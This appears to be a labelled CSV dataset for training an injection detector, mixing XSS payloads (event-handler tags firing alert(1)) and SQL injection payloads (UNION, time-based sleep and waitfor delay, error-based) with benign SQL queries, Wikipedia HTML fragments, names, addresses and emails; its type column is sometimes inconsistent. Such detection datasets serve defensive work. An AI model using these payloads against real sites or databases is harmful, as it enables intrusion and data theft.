Text,Label,type
<svg><tr onload=alert(1)></tr>,2,xss
SELECT feathers,0,sql
cluet higuerue,0,sql
<menuitem onpointermove=alert(1)>XSS</menuitem>,2,xss
sin,0,sql
bayarri bach,0,sql
"<i onmouseout=""alert(1)"">test</i>",2,xss
if  (  1665  =  3845  )   select 1665 else drop function nzod--,1,sql
"1""  )   where 8153  =  8153",1,sql
 UPDATE gently SET widely = 'president'WHERE manufacturing = 'grew',0,sql
3.52714E+15,0,sql
"1""  )   where 8390  =  8390",1,sql
SELECT * FROM fog  WHERE separate = able,0,sql
"<li id=""cite_note-221""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-221"">^ </a> </b> ",0,xss
erhard@miplat.il,0,sql
SELECT * FROM heard,0,sql
SELECT led FROM camera UNION SELECT claws FROM hello ORDER BY outside,0,sql
calle regimineto del sol 48 10e,0,sql
34839,0,sql
SELECT SEC_TO_TIME ( 1 ) ;,0,sql
"1 where 3478  =  3478   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,sql
SELECT * FROM attached WHERE story LIKE '%signal%',0,xss
-7505'   )    )    as lqvw where 8565  =  8565 or 6872  =  6872--,1,sql
"SELECT SUBDATE ( ""2017-06-15 09:34:21"", INTERVAL 3 HOUR ) ;",0,sql
<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>,2,xss
werling,0,xss
"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
SELECT * FROM zebra WHERE gulf BETWEEN 'represent' AND 'additional',0,sql
" SELECT * FROM mouth ORDER BY wish, north",0,sql
SELECT AVG ( Price ) FROM dark,0,sql
SELECT AVG ( knife ) FROM characteristic,0,sql
"1   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  1729  =  1729",1,sql
8759,0,sql
"-9247'   )    )     )   union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",1,sql
SELECT * FROM dark WHERE success = 'magnet'  AND City = 'tears',0,xss
naresh,0,xss
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",2,xss
"1'  )   where 9381  =  9381 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,sql
"<label onmouseenter=""alert(1)"">test</label>",2,xss
SELECT * FROM women WHERE bowl = 'near'  OR sea = 'ship',0,sql
<b id=x tabindex=1 onactivate=alert(1)></b>,2,xss
gaja,0,xss
basiano,0,xss
SELECT Count ( * )  AS fur,0,sql
SELECT option_value FROM wp_options WHERE option_name  =  'user_registration_queue_flush_rewrite_rules' LIMIT 1,0,xss
	 </span> </li>,0,xss
1839,0,sql
SELECT TOP 50 PERCENT * FROM customs,0,sql
"calle joan salvat papasseit s/n,",0,sql
"<style>:target {color:red;}</style><optgroup id=x style=""transition:color 1s"" ontransitionend=alert(1)></optgroup>",2,xss
camp morante,0,sql
SELECT * FROM  ( SELECT service FROM series ) ,0,sql
<dfn id=x tabindex=1 onactivate=alert(1)></dfn>,2,xss
"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
"<image onclick=""alert(1)"">test</image>",2,xss
sobrado,0,sql
otorgamiento,0,sql
1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,1,sql
"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,sql
SELECT AVG ( pattern ) FROM way SELECT SUM ( distant ) ,0,sql
SELECT * FROM ranch WHERE adult NOT BETWEEN 'pure' AND 'chamber',0,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""pawh""  =  ""pawh",1,sql
select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,xss
SELECT * FROM bag WHERE should = 'bar'  OR lower = 'difference',0,sql
DELETE FROM drew WHERE change = 'determine',0,xss
SELECT * FROM Customers  WHERE Country = 'Germany' OR Country = 'Spain';,0,sql
"<template onbeforepaste=""alert(1)"" contenteditable>test</template>",2,xss
6.8623E+15,0,sql
"<style>@keyframes slidein {}</style><frame style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frame>",2,xss
vianney,0,sql
waitfor delay '0:0:5',1,sql
"	 <div style=""padding:0em 0.25em"">",0,xss
"<multicol onpaste=""alert(1)"" contenteditable>test</multicol>",2,xss
6120,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. </li>",0,xss
SELECT TOP 50 PERCENT * FROM cross,0,sql
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationend=""alert(1)""></tr>",2,xss
SELECT AVG ( imagine ) FROM directly,0,xss
SELECT goose ( s )  FROM actual LEFT JOIN,0,sql
SELECT * FROM location ORDER BY are,0,sql
    </section>,0,xss
SELECT spring ( s )  FROM salmon LEFT JOIN,0,sql
"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",1,sql
SELECT * FROM became WHERE term BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT AVG ( from )  FROM farmer  SELECT SUM ( thirty ) ,0,sql
SELECT * FROM improve WHERE dropped IN  ( SELECT individual FROM natural ) ,0,sql
SELECT government FROM dull UNION SELECT colony FROM fourth ORDER BY personal,0,sql
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ifvz' like 'ifvz,1,sql
"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1,sql
"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",2,xss
llasera,0,sql
SELECT * FROM behavior,0,sql
SELECT TOP 3 * FROM practice,0,sql
SELECT COUNT ( markID ) FROM him,0,sql
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""pwwb"" like ""pwwb",1,sql
"<font onclick=""alert(1)"">test</font>",2,xss
"-9558"" where 7497  =  7497 or   (  2539  =  6484  )  *6484--",1,xss
"<dt><a class=""reference internal"" href=""news.html""><span class=""doc"">Release notes",0,xss
"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'sqzl'  =  'sqzl",1,sql
"1%"" waitfor delay '0:0:5'--",1,xss
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",2,xss
"<bdo onmouseleave=""alert(1)"">test</bdo>",2,xss
<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>,2,xss
"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",1,sql
1'||  (  select 'tjzy' where 3037  =  3037,1,sql
SELECT * FROM baseball ORDER BY giving DESC,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
senderow,0,sql
mira boncompte,0,xss
rigas.albalak@albeiteria.it,0,sql
"  SELECT Orders.hiddenrID, Employees.bone, Employees.safe FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planID ORDER BY Orders.frequentlyID",0,sql
1 where 8889  =  8889,1,sql
heintje0@alpesfranceses.com.ro,0,sql
c/ hermanos pinzon 178,0,sql
SELECT * FROM family,0,sql
SELECT mix ( s )  FROM solar UNION,0,sql
SELECT * FROM Customers  WHERE CustomerName LIKE '%or%';,0,sql
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and ""vzft""  =  ""vzft",1,xss
	 </span>,0,xss
waitfor delay '0:0:5' and '%'  =  ',1,xss
"<th onmouseover=""alert(1)"">test</th>",2,xss
"<noembed onkeydown=""alert(1)"" contenteditable>test</noembed>",2,xss
"<p>The simplest AI applications can be divided into two types: classifiers (""if shiny then diamond"") and controllers (""if shiny then pick up""). Controllers do, however, also classify conditions before inferring actions, and therefore classification forms a central part of many AI systems. <a href=""/wiki/Classifier_(mathematics)"" class=""mw-redirect"" title=""Classifier (mathematics)"">Classifiers </a> are functions that use <a href=""/wiki/Pattern_matching"" title=""Pattern matching"">pattern matching </a> to determine a closest match. They can be tuned according to examples, making them very attractive for use in AI. These examples are known as observations or patterns. In supervised learning, each pattern belongs to a certain predefined class. A class can be seen as a decision that has to be made. All the observations combined with their class labels are known as a data set. When a new observation is received, that observation is classified based on previous experience.<sup id=""cite_ref-Classifiers_216-0"" class=""reference""><a href=""#cite_note-Classifiers-216"">&#91;210&#93; </a> </sup>",0,xss
"<li id=""cite_note-FOOTNOTEGladwell2005-108""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEGladwell2005_108-0"">^ </a> </b> ",0,xss
"   SELECT globe, castle+ ', ' + level+ ' ' + obtain+ ', ' + route AS basic  FROM next",0,sql
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,sql
"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz",1,sql
"-4093'   )    )    union all select 5785,5785,5785#",1,xss
antigua,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
gelber serarols,0,sql
1'||  (  select 'fjlg' from dual where 9517  =  9517,1,sql
SELECT connected ( s ) FROM tightly INNER JOIN,0,sql
espinosa@chicashumedas.net,0,sql
SELECT * FROM actually WHERE movie = 'paint',0,xss
"<li id=""cite_note-408""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-408"">^ </a> </b> ",0,xss
"  SELECT select AS sail, native AS [boy]  FROM principal",0,sql
"-8544%"" or 6872  =  6872 and ""%""  =  """,1,sql
	 </span>,0,xss
"<meter draggable=""true"" ondragenter=""alert(1)"">test</meter>",2,xss
SELECT * FROM either  WHERE changing NOT LIKE '[require]%',0,sql
"<code draggable=""true"" ondragend=""alert(1)"">test</code>",2,xss
53527134q,0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""wdbg"" like ""wdbg",1,xss
SELECT MIN ( brush )  AS unknown FROM meat,0,sql
select sleep  (  5  )  -- hlgt,1,sql
<optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>,2,xss
desi4teresal,0,sql
"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1,sql
"SELECT LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0,sql
"<li id=""cite_note-79""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-79"">^ </a> </b> ",0,xss
"<style>@keyframes x{}</style><strong style=""animation-name:x"" onanimationstart=""alert(1)""></strong>",2,xss
<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>,2,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",1,sql
-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202,1,sql
caster@videotubo.pr,0,sql
"<div draggable=""true"" contenteditable>drag me</div><data ondrop=alert(1) contenteditable>drop here</data>",2,xss
"<button oncopy=""alert(1)"" contenteditable>test</button>",2,xss
"<li id=""cite_note-Propositional_logic-197""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Propositional_logic_197-0"">^ </a> </b> ",0,xss
5.88554E+15,0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262331 )  ORDER BY meta_id ASC",0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>, p.&#160;188. ",0,xss
23485,0,sql
"<li><a href=""/wiki/Electric_unicycle"" title=""Electric unicycle"">Electric unicycle </a> </li>",0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,367680,367681,367682,367683,367684,367685,367686,30220,262317,30380,80779,30384,30390,80780,290065,291072,320706 )  ORDER BY meta_id ASC",0,sql
1   )    )    as fpej where 6790  =  6790 and   (  3020  =  3020  )  *6703--,1,sql
"1' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
"  SELECT nationID AS ID, bear AS silk FROM row",0,xss
1%'  )   and 4061  =  2730#,1,sql
SELECT * FROM nice WHERE affect = 'decide'  AND City = 'whenever',0,sql
1.44E+15,0,sql
"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",1,sql
<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>,2,xss
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and '%'  =  '",1,sql
SELECT * FROM repeat WHERE observe BETWEEN 'exact' AND 'boat',0,sql
29850288z,0,sql
"<dl class=""docutils"">",0,xss
tiena,0,sql
1   )    )    as vryv where 5600  =  5600,1,sql
" select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",1,sql
SELECT * FROM  ( SELECT serious FROM salt ) ,0,sql
<plaintext onpointermove=alert(1)>XSS</plaintext>,2,xss
10410049l,0,sql
<animatetransform onpointerout=alert(1)>XSS</animatetransform>,2,xss
"<picture draggable=""true"" ondragenter=""alert(1)"">test</picture>",2,xss
"<h2>Getting help<a class=""headerlink"" href=""#getting-help"" title=""Permalink to this headline"">¶</a></h2>",0,xss
<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>,2,xss
"1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"-3215""  )   union all select 4457,4457,4457,4457,4457#",1,sql
SELECT * FROM hide WHERE secret = 'careful' FETCH FIRST 3 ROWS ONLY,0,sql
"1  )   where 2781  =  2781 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
<blink onpointerover=alert(1)>XSS</blink>,2,xss
SELECT * FROM bread WHERE easier = 'affect'  AND City = 'foot',0,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;281–298, </li>",0,xss
"<li><a href=""/wiki/Document_management_system"" title=""Document management system"">Document management </a> </li> </ul>",0,xss
SELECT TOP 3 * FROM fifty SELECT * FROM physical 3SELECT * FROM rays,0,sql
"<ol onkeyup=""alert(1)"" contenteditable>test</ol>",2,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53815 )  ORDER BY meta_id ASC",0,sql
3772,0,xss
saturnino,0,sql
SELECT principal ( s )  FROM pocket FULL OUTER JOIN,0,sql
"1%""   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
<audio src/onerror=alert(1)>,2,xss
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus",1,sql
SELECT SYSDATE (  ) ;,0,sql
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1,sql
"<label onpaste=""alert(1)"" contenteditable>test</label>",2,xss
"<li><a href=""/wiki/Unmanned_ground_vehicle"" title=""Unmanned ground vehicle"">ground </a> </li> </ul> </li>",0,xss
bota,0,sql
4.4334E+15,0,sql
chmara@novolardiseno.ky,0,sql
"<style>@keyframes x{}</style><td style=""animation-name:x"" onanimationend=""alert(1)""></td>",2,xss
	 </span>,0,xss
"<li><a href=""/wiki/Evolutionary_algorithm"" title=""Evolutionary algorithm"">Evolutionary algorithm </a> </li>",0,xss
"          <dd><a href=""/en/1.5/"">1.5</a></dd>",0,xss
reele.cto,0,sql
analytics.ready(function () {,0,xss
almedina,0,sql
"<style>@keyframes x{}</style><multicol style=""animation-name:x"" onanimationend=""alert(1)""></multicol>",2,xss
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr",1,sql
"<li><a href=""/wiki/Probability"" title=""Probability"">Probability </a> </li>",0,xss
"grupo fuensanta 197, 12?a",0,sql
"plaza cinco villas, 103,",0,xss
-1730' or 8571  =  8571--,1,sql
SELECT COUNT ( DISTINCT play )  FROM ate,0,sql
SELECT * FROM  ( SELECT conversation FROM pick ) ,0,xss
"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'msjw' like 'msjw",1,sql
estic o'neil,0,sql
SELECT * FROM rush 3 SELECT * FROM anyway,0,sql
plza. almudaina s/n,0,sql
SELECT AVG ( Price ) FROM broke,0,xss
SELECT Count ( * )  AS doctor,0,sql
"-3794'  )   union all select 2485,2485,2485,2485,2485--",1,sql
spears,0,sql
-6423'  )   or 6872  =  6872,1,sql
"avinguda guix borrull 170,",0,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga",1,sql
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,sql
" SELECT SupplierName, City, Country FROM Suppliers; INSERT INTO Customers  ( CustomerName, ContactName, Address, City, PostalCode, Country )  ",0,sql
" SELECT column_name ( s )  FROM tea,child",0,xss
segura,0,sql
1'+  (  select uhsy where 4596  =  4596 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',1,sql
SELECT * FROM  ( SELECT decide FROM led ) ,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""zwov""  =  ""zwov",1,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  +'",1,xss
"INSERT INTO down  ( myself, important, coal )  VALUES  ( 'while', 'scientific', 'fourth' )  ",0,sql
"SELECT * FROM accurate WHERE age BETWEEN ""sat"" AND    ""basis""",0,sql
27002,0,sql
"calle manco, 109, 10-g",0,sql
SELECT * FROM position WHERE rich = 'balance' FETCH FIRST 3 ROWS ONLY,0,sql
 </li>,0,xss
"<tfoot onbeforecopy=""alert(1)"" contenteditable>test</tfoot>",2,xss
SELECT * FROM limited,0,sql
SELECT AVG ( Price ) FROM stream,0,sql
"<li id=""cite_note-314""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-314"">^ </a> </b> ",0,xss
"SELECT * FROM needs WHERE pleasant BETWEEN ""fewer"" AND    ""blood""",0,xss
1'   )    )    and sleep  (  5  )  #,1,sql
"SELECT * FROM route WHERE south BETWEEN ""couple"" AND    ""forward""",0,sql
<ul>,0,xss
"<sup draggable=""true"" ondrag=""alert(1)"">test</sup>",2,xss
	 </span> </h3>,0,xss
SELECT were ( s ) FROM potatoes INNER JOIN,0,sql
"<big draggable=""true"" ondragleave=""alert(1)"">test</big>",2,xss
"<main oncontextmenu=""alert(1)"">test</main>",2,xss
"<script type=""text/javascript"">",0,xss
1   )    )    as ipfy where 1189  =  1189,1,sql
8.1203E+15,0,sql
"<ruby onmouseup=""alert(1)"">test</ruby>",2,xss
"<li><a href=""/wiki/Embedded_system"" title=""Embedded system"">Embedded system </a> </li>",0,xss
"<a href=""/wiki/Heuristic"" title=""Heuristic"">Heuristic </a> or informed searches (e.g., greedy <a href=""/wiki/Best-first_search"" title=""Best-first search"">best first </a> and <a href=""/wiki/A*_search_algorithm"" title=""A* search algorithm"">A* </a>):",0,xss
select name from syscolumns where id   =     (  sele ...,1,xss
<input2 onpointerenter=alert(1)>XSS</input2>,2,xss
"1%""   )    )    or sleep  (  5  )  #",1,sql
"	 </span> <span class=""reference-text"">",0,xss
 ,0,xss
SELECT AVG ( Price ) FROM garage,0,xss
"SELECT column1 , column2 , column3 , ... INTO newtable [IN externaldb ] FROM oldtable WHERE condition;",0,sql
 union   (  select @@version  )   --,1,sql
"<div draggable=""true"" contenteditable>drag me</div><br ondragover=alert(1) contenteditable>drop here</br>",2,xss
71196230y,0,sql
1pa5364e3a,0,xss
10328,0,sql
maggee,0,sql
argem grive,0,sql
SELECT meet ( s FROM avoid RIGHT JOIN,0,xss
"	 </span>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070810233856/http://www-formal.stanford.edu/jmc/mcchay69.html"">Archived </a> from the original on 10 August 2007<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 August ",0,xss
"SELECT SECOND ( ""23:59:59"" ) ;",0,sql
wilmont,0,xss
	 </span></p>,0,xss
<option onpointerover=alert(1)>XSS</option>,2,xss
SELECT TOP 50 PERCENT * FROM military SELECT * FROM danger FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM language,0,sql
"<li><a href=""/wiki/Petro_Grigorenko"" title=""Petro Grigorenko"">Pyotr Grigorenko </a> </li>",0,xss
SELECT COUNT ( DISTINCT climate )  FROM direction,0,xss
FROM  ( SELECT DISTINCT wealth FROM black ) ,0,sql
"<li id=""cite_note-Bayesian_inference-206""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Bayesian_inference_206-0"">^ </a> </b> ",0,xss
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",1,sql
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,2,xss
SELECT * FROM island WHERE theory  BETWEEN 10 AND 20,0,sql
"c/ otumba, 132,",0,sql
<nobr id=x tabindex=1 onactivate=alert(1)></nobr>,2,xss
 </li>,0,xss
-4758%'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   '%'  =  ',1,xss
1'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
98970543w,0,sql
"	 </span>. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1162%2Fneco.1992.4.2.234"">10.1162/neco.1992.4.2.234 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Neural+Computation&amp;rft.atitle=Learning+complex%2C+extended+sequences+using+the+principle+of+history+compression&amp;rft.volume=4&amp;rft.issue=2&amp;rft.pages=234-242&amp;rft.date=1992&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.49.3934&amp;rft_id=info%3Adoi%2F10.1162%2Fneco.1992.4.2.234&amp;rft.aulast=Schmidhuber&amp;rft.aufirst=J.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
exec sp,1,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",2,xss
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sql
intuitivo,0,sql
1%'  )   waitfor delay '0:0:5'--,1,sql
SELECT * FROM bring 3,0,sql
<option onpointerdown=alert(1)>XSS</option>,2,xss
calle ramon mario mirazo 46,0,sql
"<li><a href=""/wiki/Virtual_machine"" title=""Virtual machine"">Virtual machine </a> </li>",0,xss
"SELECT * FROM behavior WHERE diagram BETWEEN ""sound"" AND    ""pile""",0,sql
"1 where 6169  =  6169   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,sql
34473,0,sql
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",2,xss
"   SELECT grade, reason, automobileFROM no WHERE obtain  IS NOT NULL",0,sql
"""<a href=""/wiki/History_of_AI#The_golden_years_1956–1974"" class=""mw-redirect"" title=""History of AI"">Golden years </a>"" of AI (successful symbolic reasoning programs 1956–1973):",0,xss
"<li class=""toclevel-2 tocsection-8""><a href=""#Learning""><span class=""tocnumber"">4.4 ",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><section id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></section>",2,xss
	 </span> </a> </li>,0,xss
"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,sql
"1""  )   where 7914  =  7914 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,xss
SELECT AVG ( student )  FROM cabin  SELECT SUM ( led ) ,0,sql
"1'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
SELECT apart,0,xss
"c/ fancelli, 34 6b",0,sql
<xmp onpointermove=alert(1)>XSS</xmp>,2,xss
tali,0,sql
"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
59di51ca1,0,sql
<p>Having trouble? We’d like to help!</p>,0,xss
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,2,xss
"INSERT INTO solve ( fear, curious, still, perhaps, about, doctor )  VALUES  ( 'broad', 'own'. walk', 'hurry', 'children', 'love', 'drop' )  ",0,xss
"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959",1,sql
